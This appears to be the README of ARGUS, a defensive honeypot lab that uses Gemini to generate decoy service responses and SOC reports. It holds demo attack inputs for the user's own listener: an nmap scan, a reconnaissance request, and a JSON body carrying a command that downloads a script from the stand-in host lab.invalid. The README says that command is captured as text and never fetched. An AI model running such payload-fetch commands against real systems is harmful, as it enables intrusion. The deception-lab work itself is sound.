# ARGUS — Gemini Deception Grid and SOC Analyst

ARGUS is a defensive cyber-deception lab that combines a five-service network
honeypot with an existing SOC investigation pipeline. It presents believable
decoy services to scanners and interactive operators, uses Gemini to generate
fictional service responses, and records normalized evidence for review in a
live dashboard.

> **Defensive use only.** Run ARGUS on systems you own or are explicitly
> authorized to test. The default configuration is local-only. Never attach a
> honeypot to production secrets, trusted internal networks, or unrestricted
> outbound internet access.

## Highlights

- Five decoy listeners: SSH, Telnet, HTTP, HTTPS, and MySQL
- Gemini-powered, session-aware deception with safe deterministic fallback
- Configurable 1.25–2.75 second response jitter for realistic pacing
- Persistent session transcripts and telemetry in SQLite WAL mode
- Intent classification, deterministic risk scoring, and MITRE ATT&CK mapping
- On-demand Gemini + RAG SOC reports with findings, response steps, and sources
- Live dashboard with service health, sessions, transcripts, timelines, and export
- Runtime containment and source blocking without silently changing the host firewall
- Secret redaction, password hashing, bounded input, and zero command execution

## Architecture

```text
Scanner / operator
        │
        ▼
Five isolated TCP decoys
SSH · Telnet · HTTP · HTTPS · MySQL
        │
        ├──► Gemini deception engine ──► fictional response
        │
        └──► telemetry store ──► deterministic SOC triage
                                  │ correlation / risk / MITRE
                                  ├──► on-demand Gemini + RAG report
                                  ▼
                         FastAPI + live dashboard
```

Gemini controls attacker-facing fictional output and can produce an on-demand
SOC narrative grounded in the RAG knowledge base. It cannot execute commands or
access the host filesystem, tools, credentials, network, or production data.
The risk score shown for every event remains deterministic.

See [Architecture](docs/architecture.md) and [Security Model](docs/security-model.md)
for the complete data flow and trust boundaries.

## Decoy services

| Service | Local listener | Public port to redirect | Behavior |
|---|---:|---:|---|
| SSH sensor | `2222/tcp` | `22/tcp` | OpenSSH banner and client fingerprint collection |
| Telnet | `2323/tcp` | `23/tcp` | Fake login followed by a Gemini-generated shell |
| HTTP | `8088/tcp` | `80/tcp` | Finance portal, request capture, and dynamic responses |
| HTTPS | `8443/tcp` | `443/tcp` | TLS-wrapped operations API with a local self-signed certificate |
| MySQL | `33060/tcp` | `3306/tcp` | MySQL handshake, fake authentication, and generated query results |

The SSH listener is currently a scanner/banner sensor rather than a complete
cryptographic SSH server. Use Telnet for the richest interactive shell demo.

## Requirements

- Windows 10/11 or Linux
- Python 3.11 or newer
- [`uv`](https://docs.astral.sh/uv/) recommended
- A Gemini API key for generated responses
- Optional Ubuntu WSL instance for isolated demonstration traffic

## Quick start on Windows

```powershell
cd D:\CyberSheild
uv sync
Copy-Item .env.example .env
notepad .env
```

At minimum, configure:

```dotenv
GEMINI_API_KEY=your_real_key
GEMINI_MODEL=gemini-2.5-flash
HONEYPOT_USE_GEMINI=true
HONEYPOT_BIND_HOST=127.0.0.1
HONEYPOT_AUTOSTART=true
```

Start ARGUS:

```powershell
uv run uvicorn Ai.backend.api_server:app --host 127.0.0.1 --port 8000 --reload
```

Open [http://127.0.0.1:8000/dashboard](http://127.0.0.1:8000/dashboard).
If autostart is disabled, select **Start grid** in the dashboard.

The listeners can also run without the dashboard:

```powershell
uv run python -m honeypot
```

## WSL demonstration lab

To reach Windows-hosted listeners from the default WSL NAT network, change only
the honeypot listener binding in `.env`:

```dotenv
HONEYPOT_BIND_HOST=0.0.0.0
```

Keep Uvicorn bound to `127.0.0.1` so the dashboard is not published. Restart
ARGUS, then obtain the Windows host address inside Ubuntu:

```bash
TARGET=$(ip route show | awk '/default/ {print $3; exit}')
echo "$TARGET"
nmap -Pn -sT -sV -p 2222,2323,8088,8443,33060 "$TARGET"
```

Run the guarded demonstration script:

```bash
bash /mnt/d/CyberSheild/scripts/demo-attacks-wsl.sh "$TARGET"
```

The script refuses non-private destination addresses. Individual demonstrations,
expected results, and dashboard detections are documented in
[Demo Attacks](docs/demo-attacks.md) and [WSL Lab](docs/wsl-lab.md).

## PowerShell demonstration

Use these only against your own ARGUS listener. In Windows PowerShell, `curl` is
often an alias for `Invoke-WebRequest`, so the native commands below avoid shell
differences:

```powershell
cd D:\CyberSheild
.\scripts\demo-attacks.ps1 -Target 127.0.0.1
```

The guarded script accepts only localhost or private lab IPv4 addresses and
prints response bodies even when the believable decoy status is `401` or `403`.
That matters because `Invoke-WebRequest` in Windows PowerShell normally throws
on non-success HTTP status codes, which can otherwise make a successful ARGUS
interaction look like a failed request.

Equivalent individual requests are:

```powershell
$Target = "127.0.0.1"

# Reconnaissance-style request
Invoke-WebRequest -UseBasicParsing -Uri "http://${Target}:8088/admin/config"

# JSON body containing a PowerShell discovery command
$Discovery = @{ command = "Get-Process | Select-Object Name,Id" } | ConvertTo-Json
Invoke-RestMethod -Method Post -Uri "http://${Target}:8088/ops/run" `
  -ContentType "application/json" -Body $Discovery

# Payload-transfer intent; the URL is only captured as text and never fetched
$Transfer = @{ command = "Invoke-WebRequest http://lab.invalid/tool.ps1 -OutFile C:\Temp\tool.ps1" } | ConvertTo-Json
Invoke-RestMethod -Method Post -Uri "http://${Target}:8088/api/jobs" `
  -ContentType "application/json" -Body $Transfer
```

Expected behavior: every command receives a fictional decoy response; nothing in
the body is executed. The session fingerprint shows PowerShell/.NET, the second
request maps to system discovery, and the third maps to payload transfer. Each
HTTP request creates one session with exactly one **attacker action**, even though
the transcript also contains separate outbound and system telemetry events.

PowerShell 7 can exercise HTTPS as well:

```powershell
Invoke-WebRequest -SkipCertificateCheck -Uri "https://${Target}:8443/private/status"
```

The certificate is self-signed by design. Windows PowerShell 5.1 does not support
`-SkipCertificateCheck`; use the HTTP listener for the demo instead of weakening
machine-wide certificate validation.

## Response pacing

ARGUS adds random response jitter after Gemini completes so the decoy does not
reply with machine-perfect timing:

```dotenv
HONEYPOT_MIN_RESPONSE_DELAY=1.25
HONEYPOT_MAX_RESPONSE_DELAY=2.75
```

Both values are seconds. Set both to `0` for tests, or increase them for a slower
demo. The actual delay and total response latency are stored with each outbound
AI event.

## Confirm Gemini is active

After sending a dynamic request, run:

```powershell
(Invoke-RestMethod "http://127.0.0.1:8000/api/v1/honeypot/status").gemini |
    ConvertTo-Json
```

A successful response reports:

```json
{
  "configured": true,
  "healthy": true,
  "last_provider": "gemini:gemini-2.5-flash",
  "last_error": null
}
```

`GET /` and `POST /login` are intentionally deterministic. Dynamic HTTP paths,
Telnet shell commands, and MySQL queries invoke Gemini. If the provider fails,
the dashboard displays **Fallback** and exposes a redacted diagnostic message.

## Dashboard workflow

1. Confirm all five listener cards show **listening**.
2. Generate authorized traffic from WSL or another isolated lab host.
3. Select a session in **Live Sessions**.
4. Review the transcript, attacker-action count, intent, risk, and MITRE mapping.
5. In **SOC Analyst · Gemini + RAG**, select **Analyze selected session**. The
   report shows its executive assessment, findings, recommended response, RAG
   sources, Gemini model, and retrieval status. Reports are saved with the session;
   new attacker actions mark an older report as **Report outdated** until regenerated.
6. Use **Contain** to close a live connection or **Block source** to deny new
   sessions inside the running ARGUS process.
7. Export a session as JSON for evidence review, including its saved report.

The dashboard refreshes every three seconds. The fast deterministic SOC triage
runs during capture; the potentially slower Gemini + RAG report only runs when
requested and therefore does not hold up the decoy response. The underlying API
can be queried directly with `scripts/argus-health.ps1`.

If the report says **Evidence only**, deterministic findings were still produced,
but Gemini or RAG was unavailable. Confirm `GEMINI_API_KEY`, then build the local
knowledge index if needed:

```powershell
uv run python Ai/rag/vectorstore/build_index.py
```

## Telemetry

ARGUS records:

- Source address and port, destination port, timestamps, duration, and byte counts
- Service/client fingerprints, HTTP metadata, request paths, and TLS usage
- Usernames plus password length and SHA-256; raw passwords are never retained
- Commands, queries, size-limited request previews, and payload/body hashes
- Gemini provider, response latency, artificial delay, and conversation depth
- Intent, confidence, risk factors, correlation, and MITRE ATT&CK techniques
- Containment and runtime-block decisions

`Attacker actions` and `telemetry events` are deliberately different counters.
An attacker action is one inbound request, command, login attempt, query, or
client hello. Telemetry also includes every decoy banner/reply and system/SOC
annotation, so its number will be higher. Restarting ARGUS recalculates older
session counters using the same inbound-only definition.

Telemetry is stored at `logs/argus_honeypot.db`. Runtime databases, logs,
certificates, private keys, and `.env` are ignored by Git. See
[Telemetry Reference](docs/telemetry.md).

## API summary

| Method | Endpoint | Purpose |
|---|---|---|
| `GET` | `/health` | API, RAG, and runtime health |
| `GET` | `/api/v1/honeypot/status` | Listener and Gemini status |
| `POST` | `/api/v1/honeypot/control/start` | Start the five listeners |
| `POST` | `/api/v1/honeypot/control/stop` | Stop the listeners |
| `GET` | `/api/v1/honeypot/metrics` | Dashboard aggregates |
| `GET` | `/api/v1/honeypot/sessions` | List sessions |
| `GET` | `/api/v1/honeypot/sessions/{id}` | Session transcript and analysis |
| `POST` | `/api/v1/honeypot/sessions/{id}/analyze` | Generate and save Gemini + RAG SOC report |
| `POST` | `/api/v1/honeypot/sessions/{id}/contain` | Disconnect a session |
| `POST` | `/api/v1/honeypot/block-source` | Block a source inside ARGUS |
| `GET` | `/api/v1/honeypot/events` | List normalized events |
| `GET` | `/api/v1/honeypot/sessions/{id}/export` | Export evidence JSON |

See [API Reference](docs/api-reference.md) for parameters and examples.

## Configuration

All supported environment variables, defaults, and safety notes are documented
in [Configuration](docs/configuration.md). The checked-in `.env.example` contains
a ready-to-copy template. Never commit the real `.env` file.

## Testing

```powershell
uv run pytest tests -q
python -m compileall -q Ai honeypot tests
```

The test suite covers persistence, evidence export, action counting, PowerShell
and .NET HTTP framing (`100-continue` and chunked bodies), intent classification,
response pacing, all five listeners, secret handling, HTTP normalization, SOC +
RAG report persistence, port-scan detection, dashboard delivery, and API controls.

## Deployment guidance

For anything beyond a localhost/WSL demonstration:

1. Use a dedicated disposable VM, container, or isolated VLAN.
2. Deny outbound traffic at the network layer.
3. Do not mount credentials, production data, or host-management sockets.
4. Restrict dashboard access to an operator network.
5. Redirect standard public ports to ARGUS high ports only after reviewing the
   sample `deploy/argus-honeypot.nft` rules.
6. Establish retention, monitoring, and incident-response procedures.

ARGUS never modifies the host firewall automatically. See
[Security Model](docs/security-model.md) and [Troubleshooting](docs/troubleshooting.md).

## Repository layout

```text
Ai/                 Existing SOC agents, RAG pipeline, and FastAPI integration
dashboard/          Browser dashboard assets
deploy/             Optional reviewed deployment examples
docs/               Architecture, operations, API, telemetry, and lab guides
honeypot/           Decoy runtime, Gemini engine, store, and SOC bridge
scripts/            Safe demonstration and health-check helpers
tests/              Automated regression tests
```

## Contributing and reporting issues

Read [CONTRIBUTING.md](CONTRIBUTING.md) before changing behavior. Report security
issues according to [SECURITY.md](SECURITY.md), without including live credentials,
API keys, or captured third-party data.
